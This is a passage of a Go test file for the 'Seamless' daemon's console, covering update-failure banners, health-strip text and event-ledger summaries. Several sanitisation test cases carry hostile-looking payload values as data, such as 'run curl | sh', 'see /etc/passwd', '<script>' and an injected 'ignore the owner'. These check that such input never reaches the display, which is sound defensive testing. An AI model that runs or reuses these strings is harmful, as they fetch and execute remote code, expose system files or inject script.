	require.Equal(t, "Update checks and automatic updates follow the config file again: checks are on, automatic updates are on.", msg)
	_, found := storedOverride(t, db)
	require.False(t, found)
}

// The trouble banner: when it speaks, what it says, and that it never carries
// the attempt's error text.
func TestUpdateAlert(t *testing.T) {
	now := time.Date(2026, 10, 9, 12, 0, 0, 0, time.UTC)
	failed := func(why, outcome string, age time.Duration) func(st *update.Status) {
		return func(st *update.Status) {
			st.LastAttempt = &update.AttemptResult{From: ver(0, 7, 2), To: ver(0, 7, 3), Why: why, Outcome: outcome,
				Error: attemptErrorText, LogPath: "/data/update/logs/x.log", FoldedAt: now.Add(-age)}
		}
	}
	blocked := func(st *update.Status) {
		st.Blocked = []update.Block{{Version: ver(0, 7, 3), Reason: update.BlockRolledBack, At: now}}
	}
	refusal := func(word string) func(st *update.Status) {
		return func(st *update.Status) { st.LastAttempt.Stage, st.LastAttempt.Refusal = update.StageGates, word }
	}
	backoff := func(st *update.Status) {
		st.Backoff = &update.Backoff{Until: now.Add(time.Hour), Count: 1, Version: ver(0, 7, 3), Reason: update.OutcomeInterrupted}
	}
	paused := func(reason string, age time.Duration) func(st *update.Status) {
		return func(st *update.Status) {
			st.Paused = &update.Pause{Reason: reason, Versions: []update.Version{ver(0, 7, 3), ver(0, 7, 4)}, At: now.Add(-age)}
		}
	}
	autoOff := func(st *update.Status) {
		st.Settings = update.Effective(autoBase, config.UpdateOverride{Auto: boolPtr(false)}, true)
	}
	checksOff := func(st *update.Status) {
		st.Settings = update.Effective(autoBase, config.UpdateOverride{Check: boolPtr(false)}, true)
	}
	for _, tc := range []struct {
		name       string
		mutate     []func(st *update.Status)
		wantHead   string
		wantLine   string
		wantDanger bool
		wantKey    string
	}{
		{name: "rolled back, blocked", mutate: []func(*update.Status){failed(update.WhyAuto, update.OutcomeRolledBack, time.Hour), blocked},
			wantHead: "The update to v0.7.3 rolled back.", wantLine: "Seamless is back on v0.7.2, and automatic updates skip v0.7.3.",
			wantKey: fmt.Sprintf("failed-0.7.3-%d", now.Add(-time.Hour).Unix())},
		{name: "failed, backing off", mutate: []func(*update.Status){failed(update.WhyAuto, update.OutcomeFailed, time.Hour), backoff},
			wantHead: "The update to v0.7.3 failed.", wantLine: "Seamless stays on v0.7.2, and tries again in 1h."},
		{name: "refused, a stale binary: the owner's restart", mutate: []func(*update.Status){
			failed(update.WhyAuto, update.OutcomeFailed, time.Hour), refusal(update.RefusalStaleBinary), backoff},
			wantHead: "The update to v0.7.3 failed.",
			wantLine: "Seamless stays on v0.7.2, and tries again in 1h. The installed seamlessd is not the version the daemon runs; " +
				"restart the service so it runs the installed release: seamlessd restart."},
		{name: "refused, not an installer install: Update now", mutate: []func(*update.Status){
			failed(update.WhyNow, update.OutcomeFailed, time.Hour), refusal(update.RefusalNotInstaller)},
			wantHead: "The update to v0.7.3 failed.",
			wantLine: "Seamless stays on v0.7.2. The install no longer looks like one the installer manages; " +
				"restart the service so it re-reads how it was installed: seamlessd restart."},
		{name: "refused, automatic updates were off: what happened, no action", mutate: []func(*update.Status){
			failed(update.WhyAuto, update.OutcomeFailed, time.Hour), refusal(update.RefusalAutoOff)},
			wantHead: "The update to v0.7.3 failed.",
			wantLine: "Seamless stays on v0.7.2. Automatic updates were turned off before it began."},
		{name: "refused while the daemon ran another version: no action", mutate: []func(*update.Status){
			failed(update.WhyAuto, update.OutcomeFailed, time.Hour), refusal(update.RefusalStaleBinary), func(st *update.Status) { st.Version = "0.7.1" }},
			wantHead: "The update to v0.7.3 failed.",
			wantLine: "Seamless stays on v0.7.1. The installed seamlessd is not the version the daemon runs."},
		{name: "a refusal word from a newer updater: a plain failure", mutate: []func(*update.Status){
			failed(update.WhyAuto, update.OutcomeFailed, time.Hour), refusal("disk_full"), backoff},
			wantHead: "The update to v0.7.3 failed.", wantLine: "Seamless stays on v0.7.2, and tries again in 1h."},
		{name: "interrupted", mutate: []func(*update.Status){failed(update.WhyAuto, update.OutcomeInterrupted, time.Hour)},
			wantHead: "The update to v0.7.3 did not finish.", wantLine: "The updater stopped before it was done; Seamless stays on v0.7.2."},
		{name: "Update now, broken", mutate: []func(*update.Status){failed(update.WhyNow, update.OutcomeBroken, time.Hour)},
			wantHead: "The update to v0.7.3 could not be rolled back cleanly.", wantLine: "Settings > Updates has what went wrong and how to recover.", wantDanger: true},
		{name: "Update now with automatic updates off: no retry promised", mutate: []func(*update.Status){failed(update.WhyNow, update.OutcomeFailed, time.Hour), backoff, autoOff},
			wantHead: "The update to v0.7.3 failed.", wantLine: "Seamless stays on v0.7.2."},
		{name: "paused after rollbacks", mutate: []func(*update.Status){paused(update.PauseRollbacks, time.Hour), failed(update.WhyAuto, update.OutcomeRolledBack, time.Hour)},
			wantHead: "Automatic updates paused themselves.", wantLine: "Two updates in a row rolled back (v0.7.3, v0.7.4), so nothing installs by itself until you resume them.",
			wantKey: fmt.Sprintf("paused-%d", now.Add(-time.Hour).Unix())},
		{name: "paused after a broken update", mutate: []func(*update.Status){paused(update.PauseBroken, time.Hour)},
			wantHead: "Automatic updates paused themselves.", wantLine: "An update could not be rolled back cleanly (v0.7.3, v0.7.4), so nothing installs by itself until you resume them.", wantDanger: true},

		// Silent.
		{name: "no attempt"},
		{name: "applied", mutate: []func(*update.Status){failed(update.WhyAuto, update.OutcomeApplied, time.Hour)}},
		{name: "unverified", mutate: []func(*update.Status){failed(update.WhyAuto, update.OutcomeUnverified, time.Hour)}},
		{name: "superseded", mutate: []func(*update.Status){failed(update.WhyAuto, update.OutcomeSuperseded, time.Hour)}},
		{name: "an update run by hand", mutate: []func(*update.Status){failed(update.WhyManual, update.OutcomeRolledBack, time.Hour)}},
		{name: "a week later", mutate: []func(*update.Status){failed(update.WhyAuto, update.OutcomeRolledBack, troubleBannerWindow)}},
		{name: "a pause a week old", mutate: []func(*update.Status){paused(update.PauseRollbacks, troubleBannerWindow)}},
		{name: "automatic updates off: the owner's answer", mutate: []func(*update.Status){failed(update.WhyAuto, update.OutcomeRolledBack, time.Hour), autoOff}},
		{name: "a pause with automatic updates off", mutate: []func(*update.Status){paused(update.PauseRollbacks, time.Hour), autoOff}},
		{name: "checks off", mutate: []func(*update.Status){failed(update.WhyNow, update.OutcomeRolledBack, time.Hour), checksOff}},
		{name: "an update under way", mutate: []func(*update.Status){failed(update.WhyAuto, update.OutcomeRolledBack, time.Hour), func(st *update.Status) {
			st.Applying = &update.Applying{From: ver(0, 7, 2), To: ver(0, 7, 4), Why: update.WhyAuto, SpawnedAt: now}
		}}},
		{name: "already running the release", mutate: []func(*update.Status){failed(update.WhyAuto, update.OutcomeInterrupted, time.Hour), func(st *update.Status) {
			st.Version = "0.7.3"
		}}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			st := autoStatus(now)
			for _, m := range tc.mutate {
				m(&st)
			}
			a := updateAlertFor(st, now)
			if tc.wantHead == "" {
				require.Nil(t, a)
				return
			}
			require.NotNil(t, a)
			require.Equal(t, tc.wantHead, a.Head)
			require.Equal(t, tc.wantLine, a.Line)
			require.Equal(t, tc.wantDanger, a.Danger)
			if tc.wantKey != "" {
				require.Equal(t, tc.wantKey, a.Key)
			}
			require.NotContains(t, a.Head+a.Line+a.Key, "badly", "never the attempt's error text")
			require.NotContains(t, a.Head+a.Line+a.Key, "x.log", "never the attempt's log path")
		})
	}
}

// Rendered: the trouble banner rides every page, links to Settings > Updates,
// dismisses per tab through the update banner's key, and the attempt's error
// text appears in the Last attempt row and nowhere else.
func TestUpdateAlert_OnEveryPageWithoutTheErrorText(t *testing.T) {
	now := time.Now()
	st := autoStatus(now)
	withNewer(&st, now)
	st.LastAttempt = &update.AttemptResult{From: ver(0, 7, 2), To: ver(0, 7, 3), Why: update.WhyAuto,
		Outcome: update.OutcomeRolledBack, Stage: update.StageRollback, RolledBack: true,
		Error: attemptErrorText, LogPath: "/data/update/logs/x.log", FoldedAt: now.Add(-time.Hour)}
	st.Blocked = []update.Block{{Version: ver(0, 7, 3), Reason: update.BlockRolledBack, At: now.Add(-time.Hour)}}
	_, mux, _ := newUpdatesConsole(t, autoBase, &st)
	escaped := "rollback failed &lt;b&gt;badly&lt;/b&gt;"
	alertRE := regexp.MustCompile(`(?s)<div class="section notice update-alert[^"]*"[^>]*>.*?</div>\s*</div>`)
	for _, path := range []string{"/console/", "/console/memories", "/console/settings?s=updates", "/console/settings?s=experience", "/console/no-such-screen"} {
		page := getPeek(t, mux, path).Body.String()
		alert := alertRE.FindString(page)
		require.NotEmpty(t, alert, path)
		require.Contains(t, alert, `id="update-alert" role="alert" data-update-banner="failed-0.7.3-`)
		require.Contains(t, alert, "<strong>The update to v0.7.3 rolled back.</strong> Seamless is back on v0.7.2, and automatic updates skip v0.7.3.")
		require.Contains(t, alert, `<a class="btn small" href="/console/settings?s=updates">Settings &rsaquo; Updates</a>`)
		require.Contains(t, alert, "data-update-banner-dismiss")
		require.NotContains(t, alert, "data-flash", "information, not a flash the shell would toast")
		require.NotContains(t, alert, "<form", "dismissing it changes nothing on the server")

		want := 0
		if path == "/console/settings?s=updates" {
			want = 1
		}
		require.Equal(t, want, strings.Count(page, escaped), "%s: the error text appears in the Last attempt row only", path)
		require.NotContains(t, page, "<b>badly</b>", "%s: escaped wherever it appears", path)
		require.Equal(t, want, strings.Count(page, "/data/update/logs/x.log")/2, "%s: the log path shows (and copies) in that row only", path)
	}
	// A fragment is injected into a pane, never a page; a JSON caller gets data.
	require.NotContains(t, getPeek(t, mux, "/console/no-such-screen?peek=1").Body.String(), "update-alert")
	require.NotContains(t, getPeek(t, mux, "/console/?format=json").Body.String(), "update-alert")
	// The section the banner points at carries the error.
	require.Contains(t, updatesSection(t, mux), escaped)

	// The same dismissal the update banner uses, so no script changed.
	require.Contains(t, string(consoleCSS), ".update-alert[hidden] { display: none; }")
}

// The one-day "updated" banner adds Codex's hooks and an update that applied
// with warnings, from flags only.
func TestUpdateBanner_CodexHooksAndRewire(t *testing.T) {
	now := time.Now()
	for _, tc := range []struct {
		name   string
		codex  bool
		attach func(st *update.Status)
		want   []string
		absent []string
	}{
		{name: "plain", absent: []string{"Codex", "install-hooks"}},
		{name: "Codex's hooks changed", codex: true,
			want: []string{"Its Codex hooks changed: Codex skips them until you re-approve them in Codex&rsquo;s <span class=\"mono\">/hooks</span>."}},
		{name: "applied with warnings", attach: func(st *update.Status) {
			st.LastAttempt = &update.AttemptResult{From: ver(0, 7, 2), To: ver(0, 7, 3), Why: update.WhyAuto,
				Outcome: update.OutcomeApplied, Warnings: true, Error: "applied with warnings: SECRET", FoldedAt: now}
		}, want: []string{"The installer reported warnings: run <span class=\"mono\">seamlessd install-hooks</span> to re-wire your agents."},
			absent: []string{"SECRET"}},
		{name: "warnings on another release", attach: func(st *update.Status) {
			st.LastAttempt = &update.AttemptResult{From: ver(0, 7, 1), To: ver(0, 7, 2), Why: update.WhyAuto,
				Outcome: update.OutcomeApplied, Warnings: true, FoldedAt: now}
		}, absent: []string{"install-hooks"}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			st := autoStatus(now)
			st.Version = "0.7.3"
			st.Updated = &update.Updated{From: ver(0, 7, 2), To: ver(0, 7, 3), At: now.Add(-time.Hour), Direction: update.DirectionUpgrade, CodexHooks: tc.codex}
			if tc.attach != nil {
				tc.attach(&st)
			}
			_, mux, _ := newUpdatesConsole(t, autoBase, &st)
			banner := regexp.MustCompile(`(?s)<div class="section notice update-banner"[^>]*>.*?</div>\s*</div>`).
				FindString(getPeek(t, mux, "/console/").Body.String())
			require.Contains(t, banner, "<strong>Seamless updated to v0.7.3</strong> (from v0.7.2)")
			for _, want := range tc.want {
				require.Contains(t, banner, want)
			}
			for _, gone := range tc.absent {
				require.NotContains(t, banner, gone)
			}
		})
	}
}

// The health strip says what becomes of a newer release where this install
// updates itself: never "updating is your call" when it installs by itself.
func TestHealthStrip_VersionFactUnderAutomaticUpdates(t *testing.T) {
	now := time.Now()
	lead := "Seamless v0.7.3 was published " + day(now.Add(-30*time.Hour)) + "; "
	for _, tc := range []struct {
		name      string
		mutate    func(st *update.Status)
		wantText  string
		wantTone  string
		wantTitle string
	}{
		{name: "installs by itself, waiting", mutate: func(st *update.Status) {
			st.Target, st.WaitCode, st.Waiting = st.Newest, update.WaitSessions, "waiting for 1 live agent session to go idle"
		}, wantText: "v0.7.2 -- v0.7.3 available", wantTitle: lead + "it installs by itself: waiting for 1 live agent session to go idle"},
		{name: "installs by itself at the next tick", mutate: func(st *update.Status) { st.Target = st.Newest },
			wantText: "v0.7.2 -- v0.7.3 available", wantTitle: lead + "it installs by itself within a minute"},
		{name: "soaking", mutate: func(st *update.Status) {
			st.Newest.PublishedAt = now.Add(-6 * time.Hour)
		}, wantText: "v0.7.2 -- v0.7.3 available", wantTitle: "Seamless v0.7.3 was published " + day(now.Add(-6*time.Hour)) + "; it installs by itself once it is 24h old"},
		{name: "blocked: the owner's call", mutate: func(st *update.Status) {
			st.Blocked = []update.Block{{Version: ver(0, 7, 3), Reason: update.BlockVerify, At: now}}
		}, wantText: "v0.7.2 -- v0.7.3 available", wantTone: "warn",
			wantTitle: lead + "automatic updates skip it (it did not pass verification), so updating to it is your call"},
		{name: "held: the owner's own pin", mutate: func(st *update.Status) {
			st.Hold = &update.Hold{Through: ver(0, 7, 3), From: ver(0, 7, 3), At: now}
		}, wantText: "v0.7.2 -- v0.7.3 available", wantTitle: lead + "this install went back from v0.7.3, so automatic updates skip it until they are resumed"},
		{name: "unsigned", mutate: func(st *update.Status) { st.Newest.ChecksumsBundle = false },
			wantText: "v0.7.2 -- v0.7.3 available", wantTone: "warn", wantTitle: lead + "it carries no signed checksums bundle, so updating to it is your call"},
		{name: "paused", mutate: func(st *update.Status) { st.Paused = &update.Pause{Reason: update.PauseRollbacks, At: now} },
			wantText: "v0.7.2 -- v0.7.3 available", wantTone: "warn", wantTitle: lead + "automatic updates paused themselves, so updating is your call"},
		{name: "updating", mutate: func(st *update.Status) {
			st.Applying = &update.Applying{From: ver(0, 7, 2), To: ver(0, 7, 3), Why: update.WhyNow, Stage: update.StageInstall, SpawnedAt: now}
		}, wantText: "v0.7.2 -- updating to v0.7.3", wantTitle: "Updating to v0.7.3: running the installer"},
		{name: "confirming: the new version already runs", mutate: func(st *update.Status) {
			st.Version, st.Available = "0.7.3", false
			st.Applying = &update.Applying{From: ver(0, 7, 2), To: ver(0, 7, 3), Why: update.WhyAuto, Stage: update.StageConfirm, SpawnedAt: now}
		}, wantText: "v0.7.3 -- confirming the update", wantTone: "ok",
			wantTitle: "Updated from v0.7.2; the updater is confirming that v0.7.3 answers"},
		{name: "rolling back from the new version is no confirmation", mutate: func(st *update.Status) {
			st.Version, st.Available = "0.7.3", false
			st.Applying = &update.Applying{From: ver(0, 7, 2), To: ver(0, 7, 3), Why: update.WhyAuto, Stage: update.StageRollback, SpawnedAt: now}
		}, wantText: "v0.7.2 -- updating to v0.7.3", wantTitle: "Updating to v0.7.3: rolling back"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			st := autoStatus(now)
			withNewer(&st, now)
			tc.mutate(&st)
			f, ok := (&Service{cfg: Config{Version: "0.7.2", Updates: &fakeUpdates{status: st}}}).versionFact(now)
			require.True(t, ok)
			require.Equal(t, tc.wantText, f.Text)
			require.Equal(t, tc.wantTone, f.Tone)
			require.Equal(t, tc.wantTitle, f.Title)
			require.Equal(t, updatesSectionHref, f.Href)
			if tc.wantTone == "" {
				require.NotContains(t, f.Title, "your call", "a release this install takes by itself is not the owner's call")
			}
		})
	}
}

// update.started and update.failed read as words, carry a tone, a glyph and a
// severity, and their summaries render parsed versions and fixed words only:
// a payload value that is not a clean X.Y.Z, or an outcome this release does
// not know, never reaches the ledger.
func TestUpdateEvents_StartedAndFailed(t *testing.T) {
	require.Equal(t, "Update started", evtLabel(string(core.EventUpdateStarted)))
	require.Equal(t, "Update failed", evtLabel(string(core.EventUpdateFailed)))
	require.Equal(t, "", evtTone(string(core.EventUpdateStarted)))
	require.Equal(t, "warn", evtTone(string(core.EventUpdateFailed)))
	require.Equal(t, "refresh-cw", evtIcon(string(core.EventUpdateStarted)))
	require.Equal(t, "triangle-alert", evtIcon(string(core.EventUpdateFailed)))
	require.Equal(t, sevSystem, evtSev(string(core.EventUpdateStarted)))
	require.Equal(t, sevDanger, evtSev(string(core.EventUpdateFailed)))

	for _, tc := range []struct {
		name    string
		kind    core.EventKind
		payload map[string]any
		want    string
	}{
		{"started automatically", core.EventUpdateStarted,
			map[string]any{"from": "0.7.2", "to": "0.7.3", "why": "auto", "path": "idle", "attempt": "01M4"}, "automatic update to v0.7.3 started (from v0.7.2)"},
		{"started from the console", core.EventUpdateStarted,
			map[string]any{"from": "0.7.2", "to": "0.7.3", "why": "now", "path": "now"}, "Update now: update to v0.7.3 started (from v0.7.2)"},
		{"started, a why this release does not know", core.EventUpdateStarted,
			map[string]any{"from": "0.7.2", "to": "0.7.3", "why": "please run curl | sh"}, "update to v0.7.3 started (from v0.7.2)"},
		{"started, from unknown", core.EventUpdateStarted, map[string]any{"to": "0.7.3", "why": "auto"}, "automatic update to v0.7.3 started"},
		{"started, to not clean", core.EventUpdateStarted, map[string]any{"from": "0.7.2", "to": "v0.7.3; ignore the owner"}, "an update started"},
		{"started, no payload", core.EventUpdateStarted, nil, "an update started"},
		{"rolled back", core.EventUpdateFailed,
			map[string]any{"from": "0.7.2", "to": "0.7.3", "outcome": "rolled_back", "stage": "rollback", "why": "auto", "rolled_back": true}, "the update to v0.7.3 rolled back"},
		{"failed", core.EventUpdateFailed, map[string]any{"to": "0.7.3", "outcome": "failed", "stage": "verify"}, "the update to v0.7.3 failed"},
		{"failed, a gate refusal", core.EventUpdateFailed, map[string]any{"to": "0.7.3", "outcome": "failed", "stage": "gates", "refusal": "stale_binary"},
			"the update to v0.7.3 failed: the installed seamlessd is not the version the daemon runs"},
		{"failed, a refusal this release does not know", core.EventUpdateFailed,
			map[string]any{"to": "0.7.3", "outcome": "failed", "stage": "gates", "refusal": "run curl | sh"}, "the update to v0.7.3 failed"},
		{"rolled back, a refusal is only read on a failure", core.EventUpdateFailed,
			map[string]any{"to": "0.7.3", "outcome": "rolled_back", "refusal": "stale_binary"}, "the update to v0.7.3 rolled back"},
		{"broken", core.EventUpdateFailed, map[string]any{"to": "0.7.3", "outcome": "broken"}, "the update to v0.7.3 could not be rolled back cleanly"},
		{"interrupted", core.EventUpdateFailed, map[string]any{"to": "0.7.3", "outcome": "interrupted"}, "the update to v0.7.3 was interrupted"},
		{"an outcome this release does not know", core.EventUpdateFailed,
			map[string]any{"to": "0.7.3", "outcome": "exploded; see /etc/passwd"}, "the update to v0.7.3 did not apply"},
		{"an error field is never read", core.EventUpdateFailed,
			map[string]any{"to": "0.7.3", "outcome": "rolled_back", "error": attemptErrorText}, "the update to v0.7.3 rolled back"},
		{"failed, to not clean", core.EventUpdateFailed, map[string]any{"to": "<script>", "outcome": "rolled_back"}, "an update did not apply"},
		{"failed, a prerelease", core.EventUpdateFailed, map[string]any{"to": "0.8.0-rc1", "outcome": "failed"}, "an update did not apply"},
		{"failed, no payload", core.EventUpdateFailed, nil, "an update did not apply"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			require.Equal(t, tc.want, eventSummary(core.Event{Kind: tc.kind, Payload: tc.payload}))
		})
	}

	// The live row the SSE stream sends carries the same summary.
	row := toEventRow(core.Event{Kind: core.EventUpdateFailed, ItemID: "0.7.3",
		Payload: map[string]any{"to": "0.7.3", "outcome": "rolled_back", "error": attemptErrorText}})
	require.Equal(t, "the update to v0.7.3 rolled back", row.Summary)
}
